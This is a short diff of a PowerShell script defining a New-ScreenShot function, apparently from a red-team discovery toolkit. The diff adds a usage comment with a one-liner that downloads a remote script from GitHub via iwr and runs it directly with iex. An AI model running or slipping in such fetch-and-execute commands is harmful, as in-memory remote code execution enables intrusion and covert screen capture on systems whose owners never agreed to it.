@@ -1,6 +1,7 @@
 Function New-ScreenShot {
 #USAGE:
-# iex (iwr xx);New-ScreenShot --> Specify path manually 
+# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot 
+# --> Specify path manually 
 
 [cmdletbinding(SupportsShouldProcess=$True)]
 
